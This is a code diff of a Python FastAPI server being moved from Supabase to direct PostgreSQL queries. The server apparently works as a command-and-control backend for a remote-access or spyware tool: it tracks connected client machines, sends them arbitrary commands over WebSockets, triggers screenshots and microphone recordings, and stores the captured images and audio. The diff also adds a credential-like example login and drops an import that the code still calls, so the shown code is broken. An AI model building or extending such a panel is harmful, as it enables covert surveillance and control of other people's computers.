@@ -8,12 +8,11 @@ from typing import List, Dict, Optional, Any
 from datetime import datetime, timedelta
 import secrets
 import json
-from supabase import create_client, Client
-from dotenv import load_dotenv
 import jwt
-import bcrypt
 import base64
 import asyncio
+import psycopg2
+from psycopg2.extras import RealDictCursor
 
 # Load environment variables
 load_dotenv()
@@ -42,17 +41,18 @@ SUPABASE_URL = os.getenv("SUPABASE_URL", "")
 SUPABASE_KEY = os.getenv("SUPABASE_KEY", "")
 JWT_SECRET_KEY = os.getenv("JWT_SECRET_KEY", secrets.token_urlsafe(32))
 PORT = int(os.getenv("PORT", "8000"))
+DATABASE_URL = os.getenv("DATABASE_URL", "")
 
-# Initialize Supabase
-supabase: Optional[Client] = None
+# Database connection
+db_conn = None
 
 # Security
 security = HTTPBearer()
 
 # ========== DATA MODELS ==========
 class LoginRequest(BaseModel):
-    email: str = Field(..., example="admin@system.io")
-    password: str = Field(..., example="password123")
+    email: str = Field(..., example="kizer")
+    password: str = Field(..., example="kidraper67")
 
 class ClientRegister(BaseModel):
     client_id: str = Field(..., example="client-001")
@@ -81,19 +81,6 @@ class LogEntry(BaseModel):
     message: str = Field(..., example="System started")
 
 # ========== SECURITY FUNCTIONS ==========
-def hash_password(password: str) -> str:
-    """Hash password using bcrypt"""
-    salt = bcrypt.gensalt()
-    hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
-    return hashed.decode('utf-8')
-
-def verify_password(plain_password: str, hashed_password: str) -> bool:
-    """Verify password"""
-    try:
-        return bcrypt.checkpw(plain_password.encode('utf-8'), hashed_password.encode('utf-8'))
-    except Exception:
-        return False
-
 def create_jwt_token(data: dict, expires_delta: Optional[timedelta] = None) -> str:
     """Create JWT token"""
     to_encode = data.copy()
@@ -128,51 +115,123 @@ async def authenticate_user(credentials: HTTPAuthorizationCredentials = Depends(
     
     return payload
 
-# ========== DATABASE INITIALIZATION ==========
-@app.on_event("startup")
-async def startup_event():
-    """Initialize database on startup"""
-    global supabase
+# ========== DATABASE FUNCTIONS ==========
+def get_db_connection():
+    """Get database connection"""
+    global db_conn
     
-    try:
-        if not SUPABASE_URL or not SUPABASE_KEY:
-            print("⚠️  Supabase credentials not set")
-            print("💡 Please set SUPABASE_URL and SUPABASE_KEY environment variables")
-            print(f"📝 Using placeholder values for development")
-            
-            # For development without Supabase
-            supabase = None
-            return
-        
-        print(f"🔗 Initializing Supabase connection...")
-        supabase_client = create_client(SUPABASE_URL, SUPABASE_KEY)
-        
-        # Test connection with simple query
+    if db_conn is None or db_conn.closed:
         try:
-            test_response = supabase_client.table("users").select("count", count="exact").limit(1).execute()
-            print(f"✅ Database connected successfully")
+            # Try DATABASE_URL first, then SUPABASE_URL
+            db_url = DATABASE_URL or SUPABASE_URL
             
+            if not db_url:
+                print("⚠️ No database URL provided")
+                return None
             
+            # Ensure proper connection string format
+            if db_url.startswith("postgresql://"):
+                db_url = db_url.replace("postgresql://", "postgres://")
+            
+            db_conn = psycopg2.connect(db_url, cursor_factory=RealDictCursor)
+            print(f"✅ Database connected")
             
         except Exception as e:
-            print(f"❌ Database test failed: {str(e)}")
-            print("💡 Please create the tables in Supabase using the SQL schema")
-            print("💡 Or check your Supabase credentials")
-            supabase = None
-            return
+            print(f"❌ Database connection error: {e}")
+            return None
+    
+    return db_conn
+
+def verify_password_sql(email: str, password: str) -> bool:
+    """Verify password using PostgreSQL crypt function"""
+    conn = get_db_connection()
+    if not conn:
+        print("❌ No database connection for password verification")
+        return False
+    
+    try:
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT password_hash = crypt(%s, password_hash) as password_match
+            FROM users 
+            WHERE email = %s AND is_active = true
+        """, (password, email))
         
-        supabase = supabase_client
+        result = cursor.fetchone()
+        conn.commit()
         
+        if result and result['password_match']:
+            print(f"✅ Password verified for user: {email}")
+            return True
+        else:
+            print(f"❌ Password verification failed for user: {email}")
+            return False
+            
     except Exception as e:
-        print(f"❌ Startup error: {str(e)}")
-        import traceback
-        traceback.print_exc()
-        supabase = None
+        print(f"❌ Password verification error: {e}")
+        return False
+
+def get_user_by_email(email: str):
+    """Get user by email"""
+    conn = get_db_connection()
+    if not conn:
+        return None
+    
+    try:
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT id, email, is_admin, last_login
+            FROM users 
+            WHERE email = %s AND is_active = true
+        """, (email,))
+        
+        user = cursor.fetchone()
+        conn.commit()
+        return user
+    except Exception as e:
+        print(f"❌ Get user error: {e}")
+        return None
+
+def update_last_login(user_id: str):
+    """Update user's last login time"""
+    conn = get_db_connection()
+    if not conn:
+        return
+    
+    try:
+        cursor = conn.cursor()
+        cursor.execute("""
+            UPDATE users 
+            SET last_login = NOW() 
+            WHERE id = %s
+        """, (user_id,))
+        conn.commit()
+        print(f"✅ Updated last login for user: {user_id}")
+    except Exception as e:
+        print(f"❌ Update last login error: {e}")
+
+def get_client_id_from_db(client_identifier: str):
+    """Get client database ID from client_id"""
+    conn = get_db_connection()
+    if not conn:
+        return None
+    
+    try:
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT id FROM clients WHERE client_id = %s
+        """, (client_identifier,))
+        
+        result = cursor.fetchone()
+        conn.commit()
+        return result['id'] if result else None
+    except Exception as e:
+        print(f"❌ Get client ID error: {e}")
+        return None
 
 # ========== WEBSOCKET MANAGER ==========
 class ConnectionManager:
     def __init__(self):
-        self.active_connections: Dict[str, WebSocket] = {}
         self.client_connections: Dict[str, WebSocket] = {}
         self.admin_connections: List[WebSocket] = []
 
@@ -185,6 +244,20 @@ class ConnectionManager:
         await websocket.accept()
         self.client_connections[client_id] = websocket
         print(f"🖥️  Client connected: {client_id}. Total clients: {len(self.client_connections)}")
+        
+        # Update client status in database
+        conn = get_db_connection()
+        if conn:
+            try:
+                cursor = conn.cursor()
+                cursor.execute("""
+                    UPDATE clients 
+                    SET online = true, last_seen = NOW()
+                    WHERE client_id = %s
+                """, (client_id,))
+                conn.commit()
+            except Exception as e:
+                print(f"⚠️ Client status update error: {e}")
         
         # Notify admins
         await self.notify_admins({
@@ -209,6 +282,21 @@ class ConnectionManager:
         if client_id:
             del self.client_connections[client_id]
             print(f"🖥️  Client disconnected: {client_id}. Total clients: {len(self.client_connections)}")
+            
+            # Update client status in database
+            conn = get_db_connection()
+            if conn:
+                try:
+                    cursor = conn.cursor()
+                    cursor.execute("""
+                        UPDATE clients 
+                        SET online = false
+                        WHERE client_id = %s
+                    """, (client_id,))
+                    conn.commit()
+                except Exception as e:
+                    print(f"⚠️ Client status update error: {e}")
+            
             # Notify admins
             asyncio.create_task(self.notify_admins({
                 "type": "client_disconnected",
@@ -252,46 +340,18 @@ manager = ConnectionManager()
 async def login(data: LoginRequest):
     """Login endpoint"""
     try:
-        if supabase is None:
-            # For development without database
-            if data.email == "admin@system.io" and data.password == "password123":
-                token_data = {
-                    "sub": "admin@system.io",
-                    "email": "admin@system.io",
-                    "is_admin": True,
-                    "user_id": "dev-admin-001"
-                }
-                access_token = create_jwt_token(token_data)
-                
-                return {
-                    "success": True,
-                    "token": access_token,
-                    "user": {
-                        "email": "admin@system.io",
-                        "is_admin": True
-                    }
-                }
-            else:
-                raise HTTPException(status_code=401, detail="Invalid credentials")
+        print(f"🔐 Login attempt for user: {data.email}")
         
-        # Check if user exists in database
-        response = supabase.table("users") \
-            .select("*") \
-            .eq("email", data.email) \
-            .execute()
-        
-        if not response.data:
+        # Verify password using PostgreSQL crypt function
+        if not verify_password_sql(data.email, data.password):
             raise HTTPException(status_code=401, detail="Invalid credentials")
         
-        user = response.data[0]
+        # Get user details
+        user = get_user_by_email(data.email)
+        if not user:
+            raise HTTPException(status_code=401, detail="User not found")
         
-        # Verify password
-        if not verify_password(data.password, user["password_hash"]):
-            raise HTTPException(status_code=401, detail="Invalid credentials")
-        
-        # Check if user is active
-        if not user.get("is_active", True):
-            raise HTTPException(status_code=401, detail="Account disabled")
+        print(f"✅ User authenticated: {user['email']}")
         
         # Create JWT token
         token_data = {
@@ -303,13 +363,7 @@ async def login(data: LoginRequest):
         access_token = create_jwt_token(token_data)
         
         # Update last login
-        try:
-            supabase.table("users") \
-                .update({"last_login": datetime.utcnow().isoformat()}) \
-                .eq("id", user["id"]) \
-                .execute()
-        except Exception as e:
-            print(f"⚠️ Failed to update last login: {e}")
+        update_last_login(user["id"])
         
         return {
             "success": True,
@@ -330,8 +384,8 @@ async def login(data: LoginRequest):
 async def register_client(data: ClientRegister, request: Request):
     """Register a new client"""
     try:
-        if supabase is None:
-            # For development without database
+        conn = get_db_connection()
+        if not conn:
             return {
                 "success": True, 
                 "message": "Client registered (development mode)",
@@ -342,50 +396,54 @@ async def register_client(data: ClientRegister, request: Request):
         if not data.ip_address or data.ip_address == "127.0.0.1":
             data.ip_address = request.client.host if request.client else "Unknown"
         
+        cursor = conn.cursor()
+        
         # Check if client exists
-        response = supabase.table("clients") \
-            .select("*") \
-            .eq("client_id", data.client_id) \
-            .execute()
+        cursor.execute("""
+            SELECT id FROM clients WHERE client_id = %s
+        """, (data.client_id,))
         
-        client_data = {
-            "client_id": data.client_id,
-            "name": data.name,
-            "ip_address": data.ip_address,
-            "os_info": data.os_info,
-            "last_seen": datetime.utcnow().isoformat(),
-            "online": True,
-            "registered_at": datetime.utcnow().isoformat()
-        }
+        existing_client = cursor.fetchone()
         
-        if response.data:
+        if existing_client:
             # Update existing client
-            supabase.table("clients") \
-                .update(client_data) \
-                .eq("client_id", data.client_id) \
-                .execute()
-            client_id = response.data[0]["id"]
+            cursor.execute("""
+                UPDATE clients 
+                SET name = %s, ip_address = %s, os_info = %s, 
+                    last_seen = NOW(), online = true, updated_at = NOW()
+                WHERE client_id = %s
+                RETURNING id
+            """, (
+                data.name, data.ip_address, data.os_info, data.client_id
+            ))
+            client_id = cursor.fetchone()["id"]
+            action = "updated"
         else:
             # Create new client
-            insert_response = supabase.table("clients") \
-                .insert(client_data) \
-                .execute()
-            client_id = insert_response.data[0]["id"]
+            cursor.execute("""
+                INSERT INTO clients (client_id, name, ip_address, os_info, last_seen, online)
+                VALUES (%s, %s, %s, %s, NOW(), true)
+                RETURNING id
+            """, (
+                data.client_id, data.name, data.ip_address, data.os_info
+            ))
+            client_id = cursor.fetchone()["id"]
+            action = "registered"
         
         # Add log entry
         try:
-            supabase.table("logs").insert({
-                "client_id": client_id,
-                "log_type": "info",
-                "message": f"Client registered: {data.name} ({data.client_id})",
-                "created_at": datetime.utcnow().isoformat()
-            }).execute()
+            cursor.execute("""
+                INSERT INTO logs (client_id, log_type, message)
+                VALUES (%s, 'info', %s)
+            """, (client_id, f"Client {action}: {data.name} ({data.client_id})"))
         except Exception as e:
             print(f"⚠️ Log insertion error: {str(e)}")
         
+        conn.commit()
+        
         return {
             "success": True, 
-            "message": "Client registered",
+            "message": f"Client {action}",
             "client_id": data.client_id
         }
         
@@ -397,7 +455,8 @@ async def register_client(data: ClientRegister, request: Request):
 async def get_clients(_: dict = Depends(authenticate_user)):
     """Get all clients"""
     try:
-        if supabase is None:
+        conn = get_db_connection()
+        if not conn:
             # Return mock data for development
             mock_clients = [
                 {
@@ -413,12 +472,22 @@ async def get_clients(_: dict = Depends(authenticate_user)):
             ]
             return {"success": True, "clients": mock_clients}
         
-        response = supabase.table("clients") \
-            .select("*") \
-            .order("last_seen", desc=True) \
-            .execute()
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT id, client_id, name, ip_address, os_info, 
+                   online, last_seen, registered_at
+            FROM clients 
+            ORDER BY last_seen DESC NULLS LAST
+        """)
         
-        return {"success": True, "clients": response.data}
+        clients = cursor.fetchall()
+        # Convert datetime objects to ISO format strings
+        for client in clients:
+            for key in ['last_seen', 'registered_at']:
+                if client[key]:
+                    client[key] = client[key].isoformat()
+        
+        return {"success": True, "clients": clients}
     except Exception as e:
         print(f"❌ Get clients error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
@@ -427,7 +496,8 @@ async def get_clients(_: dict = Depends(authenticate_user)):
 async def get_client(client_id: str, _: dict = Depends(authenticate_user)):
     """Get specific client"""
     try:
-        if supabase is None:
+        conn = get_db_connection()
+        if not conn:
             # Return mock data for development
             mock_client = {
                 "id": "dev-001",
@@ -441,15 +511,24 @@ async def get_client(client_id: str, _: dict = Depends(authenticate_user)):
             }
             return {"success": True, "client": mock_client}
         
-        response = supabase.table("clients") \
-            .select("*") \
-            .eq("client_id", client_id) \
-            .execute()
+        cursor = conn.cursor()
+        cursor.execute("""
+            SELECT id, client_id, name, ip_address, os_info, 
+                   online, last_seen, registered_at
+            FROM clients 
+            WHERE client_id = %s
+        """, (client_id,))
         
-        if not response.data:
+        client = cursor.fetchone()
+        if not client:
             raise HTTPException(status_code=404, detail="Client not found")
         
-        return {"success": True, "client": response.data[0]}
+        # Convert datetime objects to ISO format strings
+        for key in ['last_seen', 'registered_at']:
+            if client[key]:
+                client[key] = client[key].isoformat()
+        
+        return {"success": True, "client": client}
     except HTTPException:
         raise
     except Exception as e:
@@ -464,7 +543,8 @@ async def get_commands(
 ):
     """Get recent commands"""
     try:
-        if supabase is None:
+        conn = get_db_connection()
+        if not conn:
             # Return mock data for development
             mock_commands = [
                 {
@@ -475,173 +555,59 @@ async def get_commands(
                     "status": "completed",
                     "result": "System information retrieved",
                     "created_at": datetime.utcnow().isoformat(),
-                    "completed_at": datetime.utcnow().isoformat(),
-                    "clients": {
-                        "client_id": "client-001",
-                        "name": "Development Client"
-                    }
+                    "completed_at": datetime.utcnow().isoformat()
                 }
             ]
             return {"success": True, "commands": mock_commands}
         
-        query = supabase.table("commands") \
-            .select("*, clients(client_id, name)") \
-            .order("created_at", desc=True) \
-            .limit(limit)
+        cursor = conn.cursor()
         
+        query = """
+            SELECT c.id, cl.client_id, cl.name as client_name, 
+                   c.command, c.parameters, c.status, c.result, 
+                   c.created_at, c.completed_at, c.error
+            FROM commands c
+            JOIN clients cl ON c.client_id = cl.id
+            WHERE 1=1
+        """
+        
+        params = []
         if client_id:
-            client_res = supabase.table("clients") \
-                .select("id") \
-                .eq("client_id", client_id) \
-                .execute()
-            if client_res.data:
-                query = query.eq("client_id", client_res.data[0]["id"])
+            query += " AND cl.client_id = %s"
+            params.append(client_id)
         
-        response = query.execute()
-        return {"success": True, "commands": response.data}
+        query += " ORDER BY c.created_at DESC LIMIT %s"
+        params.append(limit)
+        
+        cursor.execute(query, params)
+        commands = cursor.fetchall()
+        
+        # Format the response
+        formatted_commands = []
+        for cmd in commands:
+            formatted_cmd = dict(cmd)
+            formatted_cmd["clients"] = {
+                "client_id": cmd["client_id"],
+                "name": cmd["client_name"]
+            }
+            # Convert datetime objects
+            for key in ['created_at', 'completed_at']:
+                if formatted_cmd[key]:
+                    formatted_cmd[key] = formatted_cmd[key].isoformat()
+            del formatted_cmd["client_name"]
+            formatted_commands.append(formatted_cmd)
+        
+        return {"success": True, "commands": formatted_commands}
     except Exception as e:
         print(f"❌ Get commands error: {str(e)}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.get("/api/screenshots", response_model=dict)
-async def get_screenshots(
-    _: dict = Depends(authenticate_user),
-    client_id: Optional[str] = None,
-    limit: int = 12
-):
-    """Get recent screenshots"""
-    try:
-        if supabase is None:
-            # Return mock data for development
-            mock_screenshots = [
-                {
-                    "id": "scr-001",
-                    "client_id": "dev-001",
-                    "filename": "screenshot_2024.png",
-                    "created_at": datetime.utcnow().isoformat(),
-                    "clients": {
-                        "client_id": "client-001",
-                        "name": "Development Client"
-                    }
-                }
-            ]
-            return {"success": True, "screenshots": mock_screenshots}
-        
-        query = supabase.table("screenshots") \
-            .select("*, clients(client_id, name)") \
-            .order("created_at", desc=True) \
-            .limit(limit)
-        
-        if client_id:
-            client_res = supabase.table("clients") \
-                .select("id") \
-                .eq("client_id", client_id) \
-                .execute()
-            if client_res.data:
-                query = query.eq("client_id", client_res.data[0]["id"])
-        
-        response = query.execute()
-        return {"success": True, "screenshots": response.data}
-    except Exception as e:
-        print(f"❌ Get screenshots error: {str(e)}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.get("/api/audio", response_model=dict)
-async def get_audio(
-    _: dict = Depends(authenticate_user),
-    client_id: Optional[str] = None,
-    limit: int = 10
-):
-    """Get recent audio recordings"""
-    try:
-        if supabase is None:
-            # Return mock data for development
-            mock_audio = [
-                {
-                    "id": "aud-001",
-                    "client_id": "dev-001",
-                    "filename": "recording_2024.mp3",
-                    "created_at": datetime.utcnow().isoformat(),
-                    "clients": {
-                        "client_id": "client-001",
-                        "name": "Development Client"
-                    }
-                }
-            ]
-            return {"success": True, "audio_recordings": mock_audio}
-        
-        query = supabase.table("audio_recordings") \
-            .select("*, clients(client_id, name)") \
-            .order("created_at", desc=True) \
-            .limit(limit)
-        
-        if client_id:
-            client_res = supabase.table("clients") \
-                .select("id") \
-                .eq("client_id", client_id) \
-                .execute()
-            if client_res.data:
-                query = query.eq("client_id", client_res.data[0]["id"])
-        
-        response = query.execute()
-        return {"success": True, "audio_recordings": response.data}
-    except Exception as e:
-        print(f"❌ Get audio error: {str(e)}")
-        raise HTTPException(status_code=500, detail=str(e))
-
-@app.get("/api/logs", response_model=dict)
-async def get_logs(
-    _: dict = Depends(authenticate_user),
-    client_id: Optional[str] = None,
-    log_type: Optional[str] = None,
-    limit: int = 100
-):
-    """Get system logs"""
-    try:
-        if supabase is None:
-            # Return mock data for development
-            mock_logs = [
-                {
-                    "id": "log-001",
-                    "client_id": "dev-001",
-                    "log_type": "info",
-                    "message": "System started successfully",
-                    "created_at": datetime.utcnow().isoformat(),
-                    "clients": {
-                        "client_id": "client-001",
-                        "name": "Development Client"
-                    }
-                }
-            ]
-            return {"success": True, "logs": mock_logs}
-        
-        query = supabase.table("logs") \
-            .select("*, clients(client_id, name)") \
-            .order("created_at", desc=True) \
-            .limit(limit)
-        
-        if client_id:
-            client_res = supabase.table("clients") \
-                .select("id") \
-                .eq("client_id", client_id) \
-                .execute()
-            if client_res.data:
-                query = query.eq("client_id", client_res.data[0]["id"])
-        
-        if log_type and log_type != "all":
-            query = query.eq("log_type", log_type)
-        
-        response = query.execute()
-        return {"success": True, "logs": response.data}
-    except Exception as e:
-        print(f"❌ Get logs error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/command", response_model=dict)
 async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user)):
     """Send command to client"""
     try:
-        if supabase is None:
+        conn = get_db_connection()
+        if not conn:
             # For development without database
             command_id = f"cmd-dev-{int(datetime.utcnow().timestamp())}"
             
@@ -660,25 +626,26 @@ async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user
                 "message": "Command sent (development mode)"
             }
         
-        # Get client ID
-        client_res = supabase.table("clients") \
-            .select("id") \
-            .eq("client_id", data.client_id) \
-            .execute()
+        cursor = conn.cursor()
         
-        if not client_res.data:
+        # Get client database ID
+        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
+        client_result = cursor.fetchone()
+        
+        if not client_result:
             raise HTTPException(status_code=404, detail="Client not found")
         
-        # Create command record
-        command_res = supabase.table("commands").insert({
-            "client_id": client_res.data[0]["id"],
-            "command": data.command,
-            "parameters": data.parameters,
-            "status": "pending",
-            "created_at": datetime.utcnow().isoformat()
-        }).execute()
+        db_client_id = client_result['id']
         
-        command_id = command_res.data[0]["id"]
+        # Create command record
+        cursor.execute("""
+            INSERT INTO commands (client_id, command, parameters, status)
+            VALUES (%s, %s, %s::jsonb, 'pending')
+            RETURNING id, created_at
+        """, (db_client_id, data.command, json.dumps(data.parameters)))
+        
+        command_result = cursor.fetchone()
+        command_id = str(command_result['id'])
         
         # Try to send via WebSocket
         sent = await manager.send_to_client(data.client_id, {
@@ -690,10 +657,13 @@ async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user
         
         if not sent:
             # Update command status if WebSocket failed
-            supabase.table("commands") \
-                .update({"status": "failed", "error": "Client not connected"}) \
-                .eq("id", command_id) \
-                .execute()
+            cursor.execute("""
+                UPDATE commands 
+                SET status = 'failed', error = 'Client not connected'
+                WHERE id = %s
+            """, (command_id,))
+        
+        conn.commit()
         
         return {
             "success": True,
@@ -707,13 +677,75 @@ async def send_command(data: CommandRequest, _: dict = Depends(authenticate_user
         print(f"❌ Send command error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
+@app.get("/api/screenshots", response_model=dict)
+async def get_screenshots(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    limit: int = 12
+):
+    """Get recent screenshots"""
+    try:
+        conn = get_db_connection()
+        if not conn:
+            # Return mock data for development
+            mock_screenshots = [
+                {
+                    "id": "scr-001",
+                    "client_id": "dev-001",
+                    "filename": "screenshot_2024.png",
+                    "created_at": datetime.utcnow().isoformat()
+                }
+            ]
+            return {"success": True, "screenshots": mock_screenshots}
+        
+        cursor = conn.cursor()
+        
+        query = """
+            SELECT s.id, cl.client_id, cl.name as client_name, 
+                   s.filename, s.created_at
+            FROM screenshots s
+            JOIN clients cl ON s.client_id = cl.id
+            WHERE 1=1
+        """
+        
+        params = []
+        if client_id:
+            query += " AND cl.client_id = %s"
+            params.append(client_id)
+        
+        query += " ORDER BY s.created_at DESC LIMIT %s"
+        params.append(limit)
+        
+        cursor.execute(query, params)
+        screenshots = cursor.fetchall()
+        
+        # Format the response
+        formatted_screenshots = []
+        for scr in screenshots:
+            formatted_scr = dict(scr)
+            formatted_scr["clients"] = {
+                "client_id": scr["client_id"],
+                "name": scr["client_name"]
+            }
+            # Convert datetime objects
+            if formatted_scr["created_at"]:
+                formatted_scr["created_at"] = formatted_scr["created_at"].isoformat()
+            del formatted_scr["client_name"]
+            formatted_screenshots.append(formatted_scr)
+        
+        return {"success": True, "screenshots": formatted_screenshots}
+    except Exception as e:
+        print(f"❌ Get screenshots error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
 @app.post("/api/screenshot/{client_id}", response_model=dict)
 async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user)):
     """Request screenshot from client"""
     try:
         # Send via WebSocket
         sent = await manager.send_to_client(client_id, {
-            "type": "screenshot_request"
+            "type": "screenshot_request",
+            "timestamp": datetime.utcnow().isoformat()
         })
         
         if sent:
@@ -734,7 +766,8 @@ async def request_screenshot(client_id: str, _: dict = Depends(authenticate_user
 async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authenticate_user)):
     """Upload screenshot from client"""
     try:
-        if supabase is None:
+        conn = get_db_connection()
+        if not conn:
             screenshot_id = f"scr-dev-{int(datetime.utcnow().timestamp())}"
             
             # Notify admins
@@ -752,33 +785,39 @@ async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authentica
                 "message": "Screenshot uploaded (development mode)"
             }
         
-        # Get client ID
-        client_res = supabase.table("clients") \
-            .select("id") \
-            .eq("client_id", data.client_id) \
-            .execute()
+        cursor = conn.cursor()
         
-        if not client_res.data:
+        # Get client database ID
+        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
+        client_result = cursor.fetchone()
+        
+        if not client_result:
             raise HTTPException(status_code=404, detail="Client not found")
         
+        db_client_id = client_result['id']
+        
         # Store screenshot
-        screenshot_res = supabase.table("screenshots").insert({
-            "client_id": client_res.data[0]["id"],
-            "image_data": data.image_data,
-            "filename": data.filename,
-            "created_at": datetime.utcnow().isoformat()
-        }).execute()
+        cursor.execute("""
+            INSERT INTO screenshots (client_id, image_data, filename)
+            VALUES (%s, %s, %s)
+            RETURNING id, created_at
+        """, (db_client_id, data.image_data, data.filename))
+        
+        screenshot_result = cursor.fetchone()
+        screenshot_id = str(screenshot_result['id'])
+        
+        conn.commit()
         
         # Notify admins
         await manager.notify_admins({
             "type": "screenshot_received",
             "client_id": data.client_id,
-            "screenshot_id": screenshot_res.data[0]["id"],
+            "screenshot_id": screenshot_id,
             "filename": data.filename,
             "timestamp": datetime.utcnow().isoformat()
         })
         
-        return {"success": True, "screenshot_id": screenshot_res.data[0]["id"]}
+        return {"success": True, "screenshot_id": screenshot_id}
         
     except HTTPException:
         raise
@@ -786,60 +825,65 @@ async def upload_screenshot(data: ScreenshotUpload, _: dict = Depends(authentica
         print(f"❌ Screenshot upload error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
-@app.post("/api/upload-audio", response_model=dict)
-async def upload_audio(data: AudioUpload, _: dict = Depends(authenticate_user)):
-    """Upload audio recording from client"""
+@app.get("/api/audio", response_model=dict)
+async def get_audio(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    limit: int = 10
+):
+    """Get recent audio recordings"""
     try:
-        if supabase is None:
-            audio_id = f"aud-dev-{int(datetime.utcnow().timestamp())}"
-            
-            # Notify admins
-            await manager.notify_admins({
-                "type": "audio_received",
-                "client_id": data.client_id,
-                "audio_id": audio_id,
-                "filename": data.filename,
-                "timestamp": datetime.utcnow().isoformat()
-            })
-            
-            return {
-                "success": True,
-                "audio_id": audio_id,
-                "message": "Audio uploaded (development mode)"
+        conn = get_db_connection()
+        if not conn:
+            # Return mock data for development
+            mock_audio = [
+                {
+                    "id": "aud-001",
+                    "client_id": "dev-001",
+                    "filename": "recording_2024.mp3",
+                    "created_at": datetime.utcnow().isoformat()
+                }
+            ]
+            return {"success": True, "audio_recordings": mock_audio}
+        
+        cursor = conn.cursor()
+        
+        query = """
+            SELECT a.id, cl.client_id, cl.name as client_name, 
+                   a.filename, a.created_at
+            FROM audio_recordings a
+            JOIN clients cl ON a.client_id = cl.id
+            WHERE 1=1
+        """
+        
+        params = []
+        if client_id:
+            query += " AND cl.client_id = %s"
+            params.append(client_id)
+        
+        query += " ORDER BY a.created_at DESC LIMIT %s"
+        params.append(limit)
+        
+        cursor.execute(query, params)
+        audio_recordings = cursor.fetchall()
+        
+        # Format the response
+        formatted_audio = []
+        for aud in audio_recordings:
+            formatted_aud = dict(aud)
+            formatted_aud["clients"] = {
+                "client_id": aud["client_id"],
+                "name": aud["client_name"]
             }
+            # Convert datetime objects
+            if formatted_aud["created_at"]:
+                formatted_aud["created_at"] = formatted_aud["created_at"].isoformat()
+            del formatted_aud["client_name"]
+            formatted_audio.append(formatted_aud)
         
-        # Get client ID
-        client_res = supabase.table("clients") \
-            .select("id") \
-            .eq("client_id", data.client_id) \
-            .execute()
-        
-        if not client_res.data:
-            raise HTTPException(status_code=404, detail="Client not found")
-        
-        # Store audio
-        audio_res = supabase.table("audio_recordings").insert({
-            "client_id": client_res.data[0]["id"],
-            "audio_data": data.audio_data,
-            "filename": data.filename,
-            "created_at": datetime.utcnow().isoformat()
-        }).execute()
-        
-        # Notify admins
-        await manager.notify_admins({
-            "type": "audio_received",
-            "client_id": data.client_id,
-            "audio_id": audio_res.data[0]["id"],
-            "filename": data.filename,
-            "timestamp": datetime.utcnow().isoformat()
-        })
-        
-        return {"success": True, "audio_id": audio_res.data[0]["id"]}
-        
-    except HTTPException:
-        raise
+        return {"success": True, "audio_recordings": formatted_audio}
     except Exception as e:
-        print(f"❌ Audio upload error: {str(e)}")
+        print(f"❌ Get audio error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
 
 @app.post("/api/audio/{client_id}/record", response_model=dict)
@@ -849,7 +893,8 @@ async def record_audio(client_id: str, duration: int = 10, _: dict = Depends(aut
         # Send via WebSocket
         sent = await manager.send_to_client(client_id, {
             "type": "audio_record",
-            "duration": duration
+            "duration": duration,
+            "timestamp": datetime.utcnow().isoformat()
         })
         
         if sent:
@@ -872,7 +917,8 @@ async def stop_audio(client_id: str, _: dict = Depends(authenticate_user)):
     try:
         # Send via WebSocket
         sent = await manager.send_to_client(client_id, {
-            "type": "audio_stop"
+            "type": "audio_stop",
+            "timestamp": datetime.utcnow().isoformat()
         })
         
         if sent:
@@ -888,6 +934,145 @@ async def stop_audio(client_id: str, _: dict = Depends(authenticate_user)):
     except Exception as e:
         print(f"❌ Audio stop error: {str(e)}")
         raise HTTPException(status_code=500, detail=str(e))
+
+@app.post("/api/upload-audio", response_model=dict)
+async def upload_audio(data: AudioUpload, _: dict = Depends(authenticate_user)):
+    """Upload audio recording from client"""
+    try:
+        conn = get_db_connection()
+        if not conn:
+            audio_id = f"aud-dev-{int(datetime.utcnow().timestamp())}"
+            
+            # Notify admins
+            await manager.notify_admins({
+                "type": "audio_received",
+                "client_id": data.client_id,
+                "audio_id": audio_id,
+                "filename": data.filename,
+                "timestamp": datetime.utcnow().isoformat()
+            })
+            
+            return {
+                "success": True,
+                "audio_id": audio_id,
+                "message": "Audio uploaded (development mode)"
+            }
+        
+        cursor = conn.cursor()
+        
+        # Get client database ID
+        cursor.execute("SELECT id FROM clients WHERE client_id = %s", (data.client_id,))
+        client_result = cursor.fetchone()
+        
+        if not client_result:
+            raise HTTPException(status_code=404, detail="Client not found")
+        
+        db_client_id = client_result['id']
+        
+        # Store audio
+        cursor.execute("""
+            INSERT INTO audio_recordings (client_id, audio_data, filename)
+            VALUES (%s, %s, %s)
+            RETURNING id, created_at
+        """, (db_client_id, data.audio_data, data.filename))
+        
+        audio_result = cursor.fetchone()
+        audio_id = str(audio_result['id'])
+        
+        conn.commit()
+        
+        # Notify admins
+        await manager.notify_admins({
+            "type": "audio_received",
+            "client_id": data.client_id,
+            "audio_id": audio_id,
+            "filename": data.filename,
+            "timestamp": datetime.utcnow().isoformat()
+        })
+        
+        return {"success": True, "audio_id": audio_id}
+        
+    except HTTPException:
+        raise
+    except Exception as e:
+        print(f"❌ Audio upload error: {str(e)}")
+        raise HTTPException(status_code=500, detail=str(e))
+
+@app.get("/api/logs", response_model=dict)
+async def get_logs(
+    _: dict = Depends(authenticate_user),
+    client_id: Optional[str] = None,
+    log_type: Optional[str] = None,
+    limit: int = 100
+):
+    """Get system logs"""
+    try:
